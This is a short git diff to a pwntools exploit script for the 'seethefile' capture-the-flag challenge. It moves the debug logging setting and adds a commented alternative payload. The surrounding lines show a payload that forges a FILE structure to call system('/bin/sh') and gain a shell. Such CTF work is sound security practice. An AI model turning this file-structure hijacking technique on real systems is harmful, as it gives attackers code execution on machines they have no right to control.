@@ -5,10 +5,10 @@ __Auther__ = 'M4x'
 from pwn import *
 from time import sleep
 import sys
-context.log_level = "debug"
 context.terminal = ["deepin-terminal", "-x", "sh", "-c"]
 
 if sys.argv[1] == "l":
+    context.log_level = "debug"
     io = process("./seethefile") 
     elf = ELF("./seethefile.bak")
     libc = io.libc
@@ -58,6 +58,7 @@ if __name__ == "__main__":
     success("Step 2: hijack file structure")
     payload = 0x20 * "\x00" + p32(0x804B284) + "/bin/sh\x00" + p32(0)*11 + p32(0x804b260) + p32(3) + p32(0)*3 + p32(0x804b260) + p32(0xffffffff)*2 + p32(0) + p32(0x804b260) + p32(0) * 14 + p32(0x804B31C)
     payload +=  p32(0)*2 + p32(0x804B260)*15 + p32(systemAddr) + p32(0x804b260)*3
+    #  payload = cyclic(0x20) + p32(0x804b284) + '\x00' * 0x8c + p32(0x804b31c) + '\x00' * 0x44 + p32(systemAddr)
     exit(payload)
 
     #  io.interactive()
